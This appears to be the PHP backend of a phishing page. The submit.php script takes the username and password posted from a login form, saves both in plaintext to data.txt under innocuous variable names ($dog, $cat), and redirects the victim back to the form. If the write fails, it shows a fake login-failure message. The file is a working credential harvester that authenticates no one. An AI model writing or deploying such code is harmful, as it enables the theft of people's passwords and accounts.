<?php
// submit.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data and sanitize it
    $dog = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : 'N/A';
    $cat = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'N/A';
    
    // Prepare the data string
    $data = "Username: " . $dog . ", Password: " . $cat . "\n";
    
    // Specify the file path (ensure the server has write permissions)
    $file = 'data.txt';
    
    // Write data to the file
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
        // Success: Redirect back to the form or to a thank you page
        header('Location: index.html');
        exit;
    } else {
        // Error handling
        echo "Either no user with the given username could be found, or the password you gave was wrong. Please check the username and try again.";
    }
} else {
    // If the form wasn't submitted via POST, redirect to the form
    header('Location: index.html');
    exit;
}
?>
